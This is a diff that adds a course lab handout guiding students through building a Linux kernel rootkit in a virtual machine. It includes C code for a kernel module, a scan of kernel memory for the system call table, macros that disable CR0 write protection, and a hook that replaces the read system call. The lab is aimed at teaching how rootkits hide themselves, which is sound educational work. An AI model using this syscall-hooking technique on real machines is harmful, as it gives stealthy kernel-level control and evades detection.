@@ -30,4 +30,250 @@ A kernel rootkit is a module running in the kernel. Kernel module have unlimited
 The rootkit modify data structures and/or kernel behaviour in order to hide the presence of malicious code.
 For example, our rootkit may hide the process from the `ps` command, hide the binaries in the file system, the open socket from netstat etc.
 
-The goal o this lab is to build such rootkit!
+The goal of this lab is to build such a rootkit!
+
+## Step 0: Setup your vagrant machine
+
+I strongly (as in you will run in a lot of issue otherwise) to setup a virtual
+environment through the following [vagrant script](../vagrants/lab7/Vagrantfile).
+
+You can tweak the configuration in the `Vagrantfile`to run optimally on your hardware:
+```ruby
+config.vm.provider "virtualbox" do |vb|
+  # Display the VirtualBox GUI when booting the machine
+  vb.gui = true
+  # Customize the amount of memory on the VM:
+  vb.memory = "8192"
+  # Customize CPU cap
+  vb.customize ["modifyvm", :id, "--cpuexecutioncap", "70"]
+  # Customize number of CPU
+  vb.cpus = 6
+  # Customize VM name
+  vb.name = "lab7"
+end
+```
+
+## Step 1: Building a kernel module
+
+The first thing we are going to do is build a simple hello world kernel module.
+Kernel modules are used to add functionality to the kernel and can be dynamically loaded.
+You should all be familiar with drivers and you may have for example installed the [nouveau](https://nouveau.freedesktop.org/) drivers for nvidia card if you play video games on your Linux machine.
+
+If you setup your VM correctly, you should have a `guest` folder on your host machine in the same directory as
+you `Vagrantfile`. This folder maps to the `/vagrant` file on your guest machine.
+
+Create a file `rootkit.c` in this folder. And put in the following content:
+```C
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Thomas");
+MODULE_DESCRIPTION("Hello Module");
+MODULE_VERSION("0.0.1");
+
+static int __init lkm_example_init(void) {
+ printk(KERN_INFO "Hello, World!\n");
+ return 0;
+}
+
+static void __exit lkm_example_exit(void) {
+ printk(KERN_INFO "Goodbye, World!\n");
+}
+
+module_init(lkm_example_init);
+module_exit(lkm_example_exit);
+```
+
+If you remember [Lab 3](LAB3.md) this should looks familiar.
+The first few lines contains headers.
+Then a number of metadata associated with your module.
+An `init` and `exit` function, and finally we register those two functions.
+
+Now we need to build our kernel module, to do so you need to create a `Makefile`,
+with the following content:
+```
+obj-m += rootkit.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
+```
+
+We then need to install the kernel headers as follow:
+```
+sudo apt-get install linux-headers-`uname -r`
+```
+
+Then simply run `make all`. A bunch of files should get generated.
+
+To load your module:
+```
+sudo insmod rootkit.ko
+```
+
+To check that your module has loaded:
+```
+dmesg
+lsmod
+```
+
+To remove your module:
+```
+sudo rmmod rootkit.ko
+```
+
+To check that your module has been unloaded:
+```
+dmesg
+lsmod
+```
+
+## Step 2: Wrapping system calls
+
+The next step in building our rootkit is to wrap our system call table as to
+modify the behaviour of system calls.
+
+The first thing to do is to write a function that will find the [system call table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md). The
+code to do this is reasonably simple:
+
+```C
+#include <linux/syscalls.h>
+
+#define START_ADDRESS 0xffffffff81000000
+#define END_ADDRESS 0xffffffffa2000000
+#define SYS_CALL_NUM 300
+
+void **find_syscall_table(void)
+{
+    void **sctable;
+    void *i = (void*) START_ADDRESS;
+
+    while (i < (void*)END_ADDRESS) {
+        sctable = (void **) i;
+        // sadly only sys_close seems to be exported -- we can't check against more system calls
+        if (sctable[__NR_close] == (void *) sys_close) {
+        size_t j;
+        // sanity check: no function pointer in the system call table should be NULL
+        for (j = 0; j < SYS_CALL_NUM; j ++) {
+            if (sctable[j] == NULL) {
+                goto skip;
+            }
+        }
+        return sctable;
+        }
+        skip:
+        i += sizeof(void *);
+    }
+
+    return NULL;
+}
+```
+
+**Question:** Explain this code.
+
+Now let's modify your init function and see if this work!
+```C
+void **sys_call_table;
+
+static int __init lkm_example_init(void) {
+    printk(KERN_INFO "Hello, World!\n");
+
+    sys_call_table = find_syscall_table();
+    pr_info("Found sys_call_table at %p\n", sys_call_table);
+    return 0;
+}
+```
+
+If you load your module, and use `dmesg`, you should see something like this:
+```
+[ 5812.810179] Hello, World!
+[ 5812.811105] Found sys_call_table at ffffffff81801320
+```
+
+Now we are going to modify the behaviour of the `read` system call. We have a
+bit of work to do.
+
+First, the system call table is normally write protected. We need
+to be able to turn that off:
+```C
+#define DISABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_disable(); \
+        write_cr0(read_cr0() & (~ 0x10000)); \
+    } while (0);
+#define ENABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_enable(); \
+        write_cr0(read_cr0() | 0x10000); \
+    } while (0);
+```
+
+Now we can write our "hacked" function:
+```C
+unsigned long read_count = 0;
+
+asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
+
+asmlinkage long hacked_read(unsigned int fd, char __user *buf, size_t count)
+{
+    read_count ++;
+
+    pr_info("%d reads so far!\n", read_count);
+    return original_read(fd, buf, count);
+}
+
+static int __init lkm_example_init(void) {
+    printk(KERN_INFO "Hello, World!\n");
+
+    sys_call_table = find_syscall_table();
+    pr_info("Found sys_call_table at %p\n", sys_call_table);
+
+    void **modified_at_address = &sys_call_table[__NR_read];
+    void *modified_function = hacked_read;
+
+    DISABLE_W_PROTECTED_MEMORY
+    original_read = xchg(modified_at_address, modified_function);
+    ENABLE_W_PROTECTED_MEMORY
+
+    return 0;
+}
+```
+
+This is as simple as that!
+
+**Question:** Explain this code.
+
+Once you have built and loaded your module, you should now see something like this:
+```C
+[ 7863.500563] 529637 reads so far!
+[ 7863.500566] 529638 reads so far!
+[ 7863.500569] 529639 reads so far!
+[ 7863.500572] 529640 reads so far!
+[ 7863.540219] 529641 reads so far!
+[ 7863.540381] 529642 reads so far!
+[ 7863.540553] 529643 reads so far!
+[ 7863.540966] 529644 reads so far!
+```
+
+If you try to remove your module, your kernel will promptly crash! (if it happened to you
+simply reboot the machine)
+This is happening because we forgot to restore our system call table to its
+original state!
+
+**Question**: modify your exit function to restore the system call table.
+
+**Hint:** you need to use code similar to this, but putting back `original_read`.
+```C
+void **modified_at_address = &sys_call_table[__NR_read];
+void *modified_function = hacked_read;
+
+DISABLE_W_PROTECTED_MEMORY
+original_read = xchg(modified_at_address, modified_function);
+ENABLE_W_PROTECTED_MEMORY
+```
+
+**Question:** Similarly implement a "hacked" `write` system call.
